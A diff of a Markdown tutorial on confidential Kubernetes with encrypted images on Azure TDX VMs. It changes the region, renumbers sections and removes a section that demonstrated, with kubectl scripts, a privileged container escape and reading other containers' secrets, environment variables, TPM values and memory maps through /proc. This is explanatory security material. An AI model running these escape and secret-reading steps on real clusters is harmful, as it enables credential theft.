@@ -22,9 +22,7 @@ This hands-on demo walks through setting up a Kubernetes cluster on Azure Intel 
 6. [containerd Configuration for Encrypted Images](#6-containerd-configuration-for-encrypted-images)
 7. [Creating and Pushing Encrypted Images](#7-creating-and-pushing-encrypted-images)
 8. [Demonstrating Safety Claims (What Works)](#8-demonstrating-safety-claims-what-works)
-9. [Demonstrating What We Lose Without Kata](#9-demonstrating-what-we-lose-without-kata)
-10. [Cleanup](#10-cleanup)
----
+9. [Cleanup](#9-cleanup)
 
 ## 1. Prerequisites
 
@@ -71,8 +69,6 @@ skopeo login docker.io
 
 ```
 
----
-
 ## 2. Environment Setup
 
 Set these environment variables before proceeding. These will be used throughout the demo:
@@ -83,7 +79,7 @@ export RESOURCE_GROUP="your-assigned-resource-group"
 
 # REQUIRED: Azure region with TDX support and quota
 # Available regions: westeurope, centralus, eastus2, northeurope
-export LOCATION="westeurope"
+export LOCATION="centralus"
 
 # Network configuration
 export VNET_NAME="k8s-vnet"
@@ -130,8 +126,6 @@ az vm list-skus \
     -o table
 
 ```
-
----
 
 ## 3. Azure Infrastructure
 
@@ -375,8 +369,6 @@ Expected output should show:
 * `tss` group exists for TPM access permissions
 
 **Note**: On Azure TDX CVMs, there is no `/dev/tdx_guest` device. Instead, attestation flows through the vTPM (`/dev/tpm0`, `/dev/tpmrm0`) which is cryptographically backed by Intel TDX. The vTPM's attestation key is embedded in the TDX quote, creating a composite trust chain.
-
----
 
 ## 4. Kubernetes Cluster Setup
 
@@ -931,8 +923,6 @@ echo "    WARNING: Keys are stored in plaintext on disk - NO security guarantees
 echo ""
 ```
 
----
-
 ## 6. containerd Configuration for Encrypted Images
 
 ### 6.1 Update containerd Configuration
@@ -1036,8 +1026,6 @@ EOF
 done
 
 ```
-
----
 
 ## 7. Creating and Pushing Encrypted Images
 
@@ -1192,8 +1180,6 @@ echo "=== Secret app encrypted image pushed to: docker.io/${SECRET_APP_IMAGE} ==
 
 ```
 
----
-
 ## 8. Demonstrating Safety Claims (What Works)
 
 ### 8.1 Deploy Encrypted Workload
@@ -1263,304 +1249,16 @@ echo "=== SUCCESS: Secret application with encrypted image is running ==="
 
 ```
 
----
+## 9. Cleanup
 
-## 9. Demonstrating What We Lose Without Kata
-
-This section demonstrates the security properties that are **LOST** when not using Kata runtime with per-pod TEE isolation.
-
-### 9.1 Shared TEE Boundary - Container Escape Demo
-
-**Risk**: All containers share the same CVM. A privileged container can escape and access all other containers.
-
-```bash
-# Deploy a "high security" workload
-cat << EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: high-security-app
-  labels:
-    security: high
-spec:
-  containers:
-  - name: app
-    image: docker.io/${SECRET_APP_IMAGE}
-    imagePullPolicy: Always
-EOF
-
-# Deploy an "attacker" pod with elevated privileges
-cat << EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: attacker-pod
-  labels:
-    security: low
-spec:
-  hostPID: true
-  hostNetwork: true
-  containers:
-  - name: attacker
-    image: ubuntu:latest
-    command: ["sleep", "infinity"]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host-root
-      mountPath: /host
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
-EOF
-
-kubectl wait --for=condition=Ready pod/high-security-app --timeout=120s
-kubectl wait --for=condition=Ready pod/attacker-pod --timeout=120s
-
-echo "=== DEMONSTRATING CONTAINER ESCAPE ==="
-
-# From attacker pod, access the host
-kubectl exec -it attacker-pod -- bash << 'INNER'
-echo "=== Attacker has escaped to host namespace ==="
-echo "Hostname: $(hostname)"
-echo ""
-
-echo "=== Finding all container processes ==="
-ps aux | grep -E "(nginx|secret|entrypoint)" | head -10
-echo ""
-
-echo "=== Accessing other container filesystems via /proc ==="
-# Find the secret-app process
-SECRET_PID=$(pgrep -f "entrypoint" | head -1)
-if [ -n "$SECRET_PID" ]; then
-    echo "Found secret-app process: $SECRET_PID"
-    echo ""
-    echo "=== READING SECRETS FROM ANOTHER CONTAINER ==="
-    cat /proc/$SECRET_PID/root/app/secrets/api_key
-    cat /proc/$SECRET_PID/root/app/secrets/db_creds
-    echo ""
-    echo "=== Environment variables of secret-app ==="
-    cat /proc/$SECRET_PID/environ | tr '\0' '\n' | head -20
-fi
-INNER
-
-echo ""
-echo "=== IMPACT: With Kata, each pod runs in separate VM - this escape is IMPOSSIBLE ==="
-
-```
-
-### 9.2 No Per-Pod Attestation Identity
-
-**Risk**: All pods share the same CVM's attestation identity. KBS cannot distinguish between pods.
-
-```bash
-echo "=== DEMONSTRATING SHARED ATTESTATION IDENTITY ==="
-
-# Install tpm2-tools in the attacker pod to read TPM PCR values
-kubectl exec attacker-pod -- bash -c 'apt-get update && apt-get install -y tpm2-tools >/dev/null 2>&1'
-
-# On Azure TDX, attestation uses vTPM - all pods share the same vTPM identity
-# Get TPM PCR values from two different pods (via host access)
-kubectl exec attacker-pod -- bash -c '
-echo "Reading TPM PCR values from host..."
-if [ -e /host/dev/tpmrm0 ]; then
-    # All pods on this CVM share the same TPM identity
-    tpm2_pcrread -T "device:/host/dev/tpmrm0" sha256:0,1,2,3
-else
-    echo "TPM device not accessible from this container"
-fi
-'
-
-echo ""
-echo "=== KEY INSIGHT ==="
-echo "Both high-security-app and attacker-pod share the SAME:"
-echo "  - vTPM device (/dev/tpm0, /dev/tpmrm0)"
-echo "  - TPM attestation key (AK)"
-echo "  - TDX measurements backing the vTPM"
-echo ""
-echo "=== RESULT: Both pods have IDENTICAL attestation identity ==="
-echo "=== KBS cannot apply different policies to different pods ==="
-echo "=== With Kata: Each pod has UNIQUE attestation identity ==="
-
-```
-
-### 9.3 No Per-Pod Key Policies
-
-**Risk**: Any pod can request any key from KBS since they all have the same identity.
-
-```bash
-echo "=== DEMONSTRATING SHARED KEY ACCESS ==="
-
-# Deploy two pods that "should" have different key access
-cat << EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: tenant-a-app
-  labels:
-    tenant: a
-spec:
-  containers:
-  - name: app
-    image: docker.io/${SECRET_APP_IMAGE}
-    imagePullPolicy: Always
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: tenant-b-app
-  labels:
-    tenant: b
-spec:
-  containers:
-  - name: app
-    image: alpine:latest
-    command: ["sleep", "infinity"]
-EOF
-
-kubectl wait --for=condition=Ready pod/tenant-a-app --timeout=120s
-kubectl wait --for=condition=Ready pod/tenant-b-app --timeout=120s
-
-echo ""
-echo "Tenant A's encrypted image was decrypted successfully."
-echo "In a proper multi-tenant setup, Tenant B should NOT be able to access Tenant A's keys."
-echo ""
-echo "However, since both pods share the same CVM attestation identity,"
-echo "if Tenant B could make requests to KBS, they would get the SAME keys as Tenant A."
-echo ""
-echo "=== With Kata: Each tenant's pod has unique attestation, KBS can enforce per-tenant policies ==="
-
-```
-
-### 9.4 No Agent Policy Enforcement (kubectl exec unrestricted)
-
-**Risk**: Unlike Kata's agent policy, there's no restriction on kubectl exec.
-
-```bash
-echo "=== DEMONSTRATING UNRESTRICTED EXEC ACCESS ==="
-
-# In Kata CoCo, ExecProcessRequest is blocked by default
-# Without Kata, exec works unrestricted
-
-echo "Executing commands in secret-app pod (would be blocked in Kata CoCo):"
-echo ""
-
-echo "1. Reading secrets:"
-kubectl exec secret-app -- cat /app/secrets/api_key
-
-echo ""
-echo "2. Reading environment variables:"
-kubectl exec secret-app -- env | head -10
-
-echo ""
-echo "3. Reading process command line (exposes arguments):"
-kubectl exec secret-app -- cat /proc/1/cmdline | tr '\0' ' '
-
-echo ""
-echo "4. Installing tools and exfiltrating data:"
-kubectl exec secret-app -- sh -c 'apk add --no-cache curl 2>/dev/null; echo "Could install tools to exfiltrate secrets"'
-
-echo ""
-echo "=== With Kata CoCo: Agent policy would BLOCK ExecProcessRequest by default ==="
-echo "=== Policy example: default ExecProcessRequest := false ==="
-
-```
-
-### 9.5 Shared Namespace Risks
-
-**Risk**: Pods can be configured to share namespaces, exposing secrets.
-
-```bash
-echo "=== DEMONSTRATING SHARED NAMESPACE RISKS ==="
-
-# Deploy pods with shared process namespace
-cat << EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: shared-ns-demo
-spec:
-  shareProcessNamespace: true
-  containers:
-  - name: secret-holder
-    image: alpine:latest
-    command: ["/bin/sh", "-c"]
-    args: ["export SECRET_TOKEN=super-secret-token-xyz; while true; do sleep 3600; done"]
-  - name: observer
-    image: alpine:latest
-    command: ["sleep", "infinity"]
-EOF
-
-kubectl wait --for=condition=Ready pod/shared-ns-demo --timeout=60s
-
-echo ""
-echo "From the observer container, accessing secret-holder's environment:"
-kubectl exec shared-ns-demo -c observer -- sh -c '
-    echo "=== Processes visible (shared PID namespace) ==="
-    ps aux
-    echo ""
-    echo "=== Reading environment of other container ==="
-    # Find the sleep process from secret-holder
-    for pid in $(ls /proc | grep -E "^[0-9]+$"); do
-        if [ -f /proc/$pid/environ ]; then
-            env_content=$(cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n")
-            if echo "$env_content" | grep -q "SECRET_TOKEN"; then
-                echo "Found secret in PID $pid:"
-                echo "$env_content" | grep SECRET_TOKEN
-            fi
-        fi
-    done
-'
-
-echo ""
-echo "=== IMPACT: In shared namespace, secrets from one container are visible to another ==="
-echo "=== With Kata: Each container runs in isolated environment within the pod VM ==="
-
-```
-
-### 9.6 Memory Access Across Containers
-
-**Risk**: All containers share the same memory space within the CVM.
-
-```bash
-echo "=== DEMONSTRATING SHARED MEMORY SPACE ==="
-
-# This demonstrates that a privileged container can dump memory of other containers
-kubectl exec attacker-pod -- bash << 'INNER'
-echo "=== Attacker can access memory of all processes on the CVM ==="
-
-# Find a target process
-TARGET_PID=$(pgrep -f "nginx" | head -1)
-if [ -n "$TARGET_PID" ]; then
-    echo "Target nginx process: $TARGET_PID"
-    echo ""
-    echo "=== Memory maps of nginx process ==="
-    cat /proc/$TARGET_PID/maps | head -20
-    echo ""
-    echo "In a real attack, the attacker could:"
-    echo "  1. Dump process memory with gcore"
-    echo "  2. Search for secrets, keys, tokens"
-    echo "  3. Access decrypted image data in memory"
-fi
-
-echo ""
-echo "=== With Kata: Each pod's memory is in a SEPARATE encrypted VM ==="
-echo "=== Hardware memory encryption (TDX/SEV) isolates pod memory ==="
-INNER
-
-```
-
-## 10. Cleanup
-
-### 10.1 Delete Kubernetes Resources
+### 9.1 Delete Kubernetes Resources
 
 ```bash
 kubectl delete pod --all --force --grace-period=0
 
 ```
 
-### 10.2 Delete Azure Resources
+### 9.2 Delete Azure Resources
 
 ```bash
 # Delete VMs
@@ -1591,7 +1289,7 @@ echo "=== Cleanup initiated. Resources will be deleted in background. ==="
 
 ```
 
-### 10.3 Local Cleanup
+### 9.3 Local Cleanup
 
 ```bash
 rm -rf ~/coco-demo
